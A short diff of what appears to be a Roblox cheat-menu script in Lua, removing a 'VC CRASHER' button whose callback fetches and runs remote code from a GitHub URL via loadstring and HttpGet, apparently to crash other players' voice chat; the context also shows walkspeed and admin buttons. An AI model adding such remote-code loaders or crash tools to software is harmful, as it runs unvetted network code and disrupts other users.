@@ -674,16 +674,6 @@ local IYAdmin = Tabs.Player:AddButton({
     end
 })
 
-local IYAdmin = Tabs.Player:AddButton({
-    Title = "VC CRASHER",
-    Description = "Crashes Vc",
-
-    Callback = function()
--- ez roblox
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Rootleak/Stalkie-2.0/refs/heads/main/vc.lua"))()
-    end
-})
-
 -- [[ Player Section ]]
 local WalkspeedSlider = Tabs.Player:AddSlider("Slider", {
     Title = "Walkspeed",
